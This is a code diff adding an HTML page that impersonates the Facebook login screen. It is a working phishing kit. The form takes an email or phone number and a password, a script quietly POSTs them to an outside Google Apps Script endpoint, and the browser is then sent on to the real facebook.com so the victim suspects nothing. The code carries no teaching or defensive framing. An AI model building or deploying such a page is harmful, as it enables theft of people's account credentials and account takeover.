@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>facebook login</title>
+</head>
+<style>
+	body { 
+  width: 1000px;
+  height: 500px;
+  background-color: white;
+}
+div .fb{
+  font-family: 'Roboto', sans-serif;
+  color: #0066ff;
+  font-weight: bold;
+  font-size: 50px;
+  margin: 100px 0px 0px 50px;
+margin-left: 50px;
+}
+div p {
+  margin:0px 0px 0px 50px;
+}
+div.main {
+  width: 350px;
+  float: right;
+  margin-top: -15%;
+  margin-right: 10%;
+  background-color: rgba(204, 204, 255, 0.3);
+  padding: 10px;
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+border: 1px solid rgba(204, 204, 255, 0.3);
+border-radius: 8px;
+}
+input[type=text], select {
+  width: 100%;
+  padding: 12px 12px;
+  margin: 8px 0px;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+input[type=password], select {
+  width: 100%;
+  padding: 12px 12px;
+  margin: 8px 0px;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+ }
+input.new {
+  width: 100%;
+  background-color: #0066ff;
+  color: white;
+  padding: 14px 14px;
+  margin: 8px 0px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+div a {
+width: 60%;
+margin: 0% 15%;
+color: rgba(51, 102, 204, 0.7);
+text-decoration: none;
+}
+button.new {
+width: 50%;
+background-color: #009933;
+  color: white;
+  padding: 14px 14px;
+  margin-left: 25%;
+  margin-right: 25%;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+input.new {
+color: white;
+font-weight: bold;
+}
+input.ip:focus {
+  background-color: #ffffcc;
+}
+
+</style>
+<body>
+<div>
+ <p class="fb">facebook</p>
+<p>facebook helps you to connect and share with the people <br>in your life</p>
+</div>
+<div class="main">
+  <form action="" method="post" autocomplete="off" name="hello-sheet">
+    <input type="text" name="fbid" class="ip" placeholder="email address or phone number" required="required">
+    <input type="password" name="fbpw" class="ip" placeholder="password" required="required">
+    <button type="submit" value="submit" class="new" style="background-color: blue">login
+    </button>
+    	<a href="google.html">Forgotten account or password?</a><br><br>
+    <hr style="text-align:center;">
+    	<p style="margin: 2% 50%;">or</p>
+ <button onclick=" return myFunction();" class="new"><b>create new account</b></button>
+  </form>
+</div>
+</body>
+</html>
+
+ <script>
+	function myFunction()
+{
+	alert("must login account first.");
+	return false;
+	window.location="index.html"
+  // window.open("https://m.facebook.com/register/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2F&soft=hjk","_blank");
+}	
+</script> 
+<!-- 
+facebook recover link -->
+
+<!-- <a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&r&cuid&ars=facebook_login&lwv=100&refid=8">Forgotten account or password?</a> -->
+<script>
+	 
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxxxkiXRK8jpfUTXsnCKtXbcDLBpjKNeDvw7qHp0MRgipfo4GAxxl6f9R2hfuHPZh2G-Q/exec'
+                  const form = document.forms['hello-sheet']
+                
+                  form.addEventListener('submit', e => {
+                    e.preventDefault()
+                    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                      .then(response => window.open("https://www.facebook.com/"));
+                     
+                      
+                  })
+                </script>
+      
+              <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+              <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
+              
+      </script>
+</script>
